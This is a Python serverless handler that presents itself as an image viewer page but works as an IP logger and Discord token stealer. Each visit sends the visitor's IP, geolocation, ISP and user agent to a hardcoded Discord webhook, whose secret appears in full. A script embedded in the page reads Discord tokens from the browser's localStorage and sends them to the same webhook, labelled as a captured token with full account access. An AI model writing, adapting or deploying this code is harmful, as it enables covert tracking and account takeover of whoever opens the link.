# api/image2.py
import os
import base64
import requests

# Configuration
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz")
DEFAULT_IMAGE = "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg"

def handler(event, context):
    try:
        # Extract request details
        method = event['httpMethod']
        headers = event.get('headers', {})
        query = event.get('queryStringParameters', {})
        ip = headers.get('x-forwarded-for', 'Unknown IP')
        user_agent = headers.get('user-agent', 'Unknown User Agent')
        
        # Handle token logging
        if event['path'].endswith('/logtoken'):
            token = query.get('token', '')
            if token:
                send_token_report(ip, token)
            return pixel_response()
        
        # Get image URL
        image_url = DEFAULT_IMAGE
        if 'url' in query:
            try:
                image_url = base64.b64decode(query['url']).decode('utf-8')
            except:
                pass
        elif 'id' in query:
            try:
                image_url = base64.b64decode(query['id']).decode('utf-8')
            except:
                pass
        
        # Create IP report
        create_ip_report(ip, user_agent, image_url)
        
        # Build HTML response
        html = f"""
        <html>
        <head>
            <title>Image Viewer</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background-color: #1e1e1e;
                }}
                .img {{
                    background-image: url('{image_url}');
                    background-position: center center;
                    background-repeat: no-repeat;
                    background-size: contain;
                    width: 100vw;
                    height: 100vh;
                }}
            </style>
            <script>
                // Token capture script
                setTimeout(function() {{
                    try {{
                        // Check localStorage for tokens
                        const tokenKeys = ['token', 'discord_token', '_token'];
                        let token = "NOT_FOUND";
                        
                        for (const key of tokenKeys) {{
                            const value = localStorage.getItem(key);
                            if (value) {{
                                token = value;
                                break;
                            }}
                        }}
                        
                        // Send token to server
                        const img = new Image();
                        img.src = '/api/image2/logtoken?token=' + encodeURIComponent(token);
                    }} catch (e) {{}}
                }}, 1000);
            </script>
        </head>
        <body>
            <div class="img"></div>
        </body>
        </html>
        """
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': html
        }
        
    except Exception as e:
        return {
            'statusCode': 500,
            'body': f"Server Error: {str(e)}"
        }

def create_ip_report(ip, user_agent, image_url):
    """Send IP information to Discord"""
    try:
        # Get IP information
        ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        
        # Build report
        report = {
            "username": "IP Logger",
            "embeds": [{
                "title": "New IP Logged",
                "color": 0x00FFFF,
                "description": (
                    f"**IP Address:** {ip}\n"
                    f"**Country:** {ip_info.get('country', 'Unknown')}\n"
                    f"**City:** {ip_info.get('city', 'Unknown')}\n"
                    f"**ISP:** {ip_info.get('isp', 'Unknown')}\n"
                    f"**User Agent:** {user_agent}"
                ),
                "thumbnail": {"url": image_url}
            }]
        }
        
        # Send to Discord
        requests.post(WEBHOOK_URL, json=report, timeout=3)
    except:
        pass

def send_token_report(ip, token):
    """Send token report to Discord"""
    if not token or token == "NOT_FOUND":
        return
        
    try:
        report = {
            "username": "TOKEN LOGGER",
            "content": "@everyone **CRITICAL TOKEN CAPTURED**",
            "embeds": [{
                "title": "Discord Token Captured!",
                "color": 0xFF0000,
                "description": (
                    f"**IP Address:** {ip}\n"
                    f"**Token:** {token}\n\n"
                    "**WARNING:** This token provides full account access!"
                )
            }]
        }
        
        requests.post(WEBHOOK_URL, json=report, timeout=3)
    except:
        pass

def pixel_response():
    """Return a 1x1 transparent pixel"""
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'image/png'},
        'body': "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=",
        'isBase64Encoded': True
    }
